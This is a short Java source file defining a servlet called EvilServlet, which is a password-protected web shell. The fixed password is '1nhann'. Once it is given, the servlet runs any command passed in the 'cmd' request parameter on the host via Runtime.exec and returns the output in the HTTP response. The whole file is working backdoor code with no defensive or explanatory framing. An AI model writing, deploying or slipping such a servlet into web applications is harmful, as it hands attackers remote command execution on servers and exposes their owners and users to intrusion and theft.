import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(value = "/1nhann",name = "1nhann")
public class EvilServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPost(req,resp);
    }
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        req.setCharacterEncoding("UTF-8");
        String password = req.getParameter("password");

        if (password != null) {
            if (password.equals("1nhann")) {
                String cmd = req.getParameter("cmd");
                Runtime rt = Runtime.getRuntime();
                Process process = rt.exec(cmd);
                java.io.InputStream in = process.getInputStream();
                java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                String s = null;
                StringBuilder sb = new StringBuilder();
                while ((s = stdInput.readLine()) != null) {
                    sb.append(s);
                    sb.append("\n");
                }
                resp.getWriter().write(sb.toString());
                return;
            }
        }
    }
}
